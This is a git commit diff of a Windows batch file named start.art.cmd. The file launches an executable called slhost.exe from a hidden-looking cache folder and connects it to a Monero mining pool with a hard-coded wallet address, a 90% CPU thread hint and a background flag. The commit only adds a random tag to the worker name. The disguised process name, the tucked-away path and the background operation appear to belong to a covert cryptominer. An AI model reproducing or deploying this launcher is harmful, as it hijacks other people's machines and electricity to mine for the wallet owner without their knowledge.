5fd27f118bb2ab430e307606c264d5e52f640192
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2024-01-23 17:18:42 -0300

    Update start.art.cmd

--- start.art.cmd
+++ start.art.cmd
@@ -1,2 +1,2 @@
 @echo off
-%USERPROFILE%\.cache\services\slhost\slhost.exe -o gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p "ART %OS%" --cpu-max-threads-hint=90% -B
+%USERPROFILE%\.cache\services\slhost\slhost.exe -o gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p "%RANDOM% ART %OS%" --cpu-max-threads-hint=90% -B
